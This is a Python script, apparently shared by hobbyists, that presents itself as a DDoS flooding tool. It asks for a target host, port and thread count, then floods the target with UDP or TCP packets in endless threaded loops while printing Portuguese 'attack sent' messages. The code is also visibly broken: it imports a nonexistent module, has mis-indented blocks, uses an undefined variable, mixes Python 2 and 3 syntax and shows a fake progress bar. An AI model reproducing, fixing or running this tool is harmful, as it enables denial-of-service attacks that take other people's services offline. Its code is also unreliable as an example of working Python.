#!/usr/bin/env python3
#Code by LeeOn123
#Codigo melhorado 2x por Elbielzinho
import sys
import system
import os
import time
import random
import socket
import threading
#Codigo do Tempoo
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("figlet DDoS/Packet")
print("")
print("--> Script Melhorado V2 <--")
print("--> Criador Elbielzinho <--")
print("")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Packet(y/n):"))
ddos = str(input(" DDoS(y/n):"))
times = int(input(" Tamanho de Packet/DDoS:"))
threads = int(input(" Potencia:"))
def run():

os.system("figlet CARREGANDO")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[=================     ] 99%"
time.sleep(10)
print "[≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠] ERROR"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(" ATAQUE ENVIANDO PARA ",(ip)" COM SUCESSO ")
		except:
			print("DDoS/Packet ERROR")
			print("The attack failed")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" ATAQUE ENVIANDO PARA ",(ip)" COM SUCESSO ")
		except:
			s.close()
			print("DDoS/Packet ERROR")
			print("The attack failed")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
